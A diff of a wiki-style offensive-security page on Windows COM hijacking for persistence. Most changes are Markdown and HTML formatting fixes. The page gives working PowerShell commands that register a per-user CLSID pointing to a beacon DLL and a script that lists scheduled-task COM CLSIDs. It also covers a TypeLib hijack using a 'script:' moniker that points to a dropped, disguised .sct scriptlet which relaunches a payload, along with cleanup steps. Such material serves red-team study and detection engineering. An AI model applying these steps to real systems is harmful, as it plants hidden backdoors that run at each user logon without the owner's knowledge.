@@ -1,6 +1,5 @@
 # COM Hijacking
 
-
 ### Searching not existent COM components
 
 As the values of HKCU can be modified by the users **COM Hijacking** could be used as a **persistent mechanisms**. Using `procmon` it's easy to find searched COM registries that doesn't exist that an attacker could create to persist. Filters:
@@ -16,12 +15,12 @@ New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
-```
+
 ### Hijackable Task Scheduler COM components
 
 Windows Tasks use Custom Triggers to call COM objects and because they're executed through the Task Scheduler, it's easier to predict when they're gonna be triggered.
 
-_# Show COM CLSIDs
+<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
 
 foreach ($Task in $Tasks)
@@ -45,10 +44,10 @@ foreach ($Task in $Tasks)
 }
 
 # Sample Output:
-# Task Name:  Example
-# Task Path:  \Microsoft\Windows\Example\
+<strong># Task Name:  Example
+</strong># Task Path:  \Microsoft\Windows\Example\
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
-# [more like the previous one...]```
+# [more like the previous one...]</code></pre>
 
 Checking the output you can select one that is going to be executed **every time a user logs in** for example.
 
@@ -74,7 +73,7 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-```
+
 Then, you can just create the HKCU entry and everytime the user logs in, your backdoor will be fired.
 
 ---
@@ -95,7 +94,7 @@ $libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(def
 $ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
 "CLSID=$clsid  LIBID=$libid  VER=$ver"
 ```
-```
+
 2) Point the per-user TypeLib path to a local scriptlet using the `script:` moniker (no admin rights required):
 
 ```powershell
@@ -103,13 +102,13 @@ $dest = 'C:\\ProgramData\\Udate_Srv.sct'
 New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
 Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
 ```
-```
+
 3) Drop a minimal JScript `.sct` that relaunches your primary payload (e.g. a `.lnk` used by the initial chain):
 
 ```xml
 <?xml version="1.0"?>
 <scriptlet>
-  
+  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
   <script language="JScript">
     <![CDATA[
       try {
@@ -122,7 +121,7 @@ Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32"
   </script>
 </scriptlet>
 ```
-```
+
 4) Triggering – opening IE, an application that embeds the WebBrowser control, or even routine Explorer activity will load the TypeLib and execute the scriptlet, re-arming your chain on logon/reboot.
 
 Cleanup
@@ -132,15 +131,13 @@ Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$n
 # Delete the dropped scriptlet
 Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
 ```
-```
+
 Notes
 - You can apply the same logic to other high-frequency COM components; always resolve the real `LIBID` from `HKCR\CLSID\{CLSID}\TypeLib` first.
 - On 64-bit systems you may also populate the `win64` subkey for 64-bit consumers.
 
 ## References
 
-- [[https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661|Hijack the TypeLib – New COM persistence technique (CICADA8)]]
-- [[https://research.checkpoint.com/2025/zipline-phishing-campaign/|Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies]]
-
-
+- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
 
